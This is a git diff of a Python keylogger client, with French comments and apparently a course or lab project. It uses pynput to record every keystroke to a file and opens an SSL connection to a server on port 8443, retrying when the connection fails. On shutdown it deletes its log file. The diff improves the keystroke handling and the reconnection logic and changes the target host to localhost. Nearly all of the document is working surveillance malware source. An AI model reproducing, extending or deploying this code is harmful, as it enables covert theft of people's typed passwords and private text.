@@ -3,7 +3,8 @@ import ssl
 import time
 import pathlib
 from pynput import keyboard
-from threading import Thread, Event
+import os
+
 
 def read_data_from_file(file_path):
     with open(file_path, 'r') as file:
@@ -15,26 +16,39 @@ def add_one_char(char):
     with open('keylogger.txt', "a") as f:
         f.write(char)
 
+
 def del_one_char():
-    with open('keylogger.txt', 'r+') as f:
-        f.truncate()
+    with open('keylogger.txt', 'rb+') as f:
+        f.seek(0,2)
+        size=f.tell()
+        f.truncate(size-1)
 
 
 def record_key(key):
 
-    if hasattr(key, 'char'):
-        print(key.char)
-        add_one_char(key.char)
-    elif key == "'Key.enter'":
-        print("enter")
+    if str(key) == "Key.enter":
         add_one_char("\n")
-    elif key == "'Key.space'":
-        print("space")
+    elif str(key) == "Key.space":
         add_one_char(" ")
-    elif key == "'Key.backspace'":
-        print("delete")
+    elif str(key) == "Key.backspace":
         del_one_char()
+    elif hasattr(key, 'char'):
+        add_one_char(key.char)
 
+
+def stop_client(conn, socket, listener, filepath):
+
+    # arrêt du listener
+    listener.stop()
+
+    # arrêt de la connexion
+    conn.close()
+    socket.close()
+
+    # suppression du fichier (sans erreur si le fichier n'existe pas)
+    pathlib.Path.unlink(filepath, missing_ok=True)
+
+    exit()
 
 
 def create_ssl_conn(host, port):
@@ -51,28 +65,33 @@ def create_ssl_conn(host, port):
     # Connexion au serveur (avec implémentation du chiffrement)
     conn_ssl = context_ssl.wrap_socket(client_socket, server_hostname='localhost')
 
-    try:
-        conn_ssl.connect((host, port))
+    retries = 0
+    disconnected = True
 
-    except Exception as e:
-        print("Erreur lors de la connexion")
-        return "error", "error"
+    t1 = time.time()
 
-    return conn_ssl, client_socket
+    while disconnected:
+        t2 = time.time()
 
+        if t2 - t1 > 2:
+            t1 = t2
 
-def stop_client(conn, socket, listener, filepath):
-    # arrêt de la connexion
-    conn.close()
-    socket.close()
+            try:
+                conn_ssl.connect((host, port))
+                return conn_ssl, client_socket
 
-    # arrêt du listener
-    listener.join()
+            except Exception as e:
+                print("Erreur lors de la connexion")
+                print(e)
 
-    # suppression du fichier (sans erreur si le fichier n'existe pas)
-    pathlib.Path.unlink(filepath, missing_ok=True)
+                retries = retries + 1
+                
+                # si le nombre maximum de tentative de connexion a été atteint
+                if retries > 3:
+                    print("Le serveur est injoingnable !")
 
-    exit()
+                    # arrêt du client
+                    stop_client(conn_ssl, client_socket, listener, file_path)
 
 
 
@@ -81,13 +100,15 @@ listener = keyboard.Listener(on_press=record_key)
 listener.start()
 
 
-host = '172.16.120.1'
+host = '127.0.0.1'
 port = 8443 
 
 file_path = 'keylogger.txt'  
 
-# Lire les données du fichier
-keyboard_data = read_data_from_file(file_path)
+#Vérifiction si le fichier keylogger.txt existe
+if not os.path.exists(file_path):
+    with open(file_path, 'w') as f:
+        f.write("Data collected :\n")
 
 # création du socket et de la connexion
 conn, client_socket = create_ssl_conn(host, port)
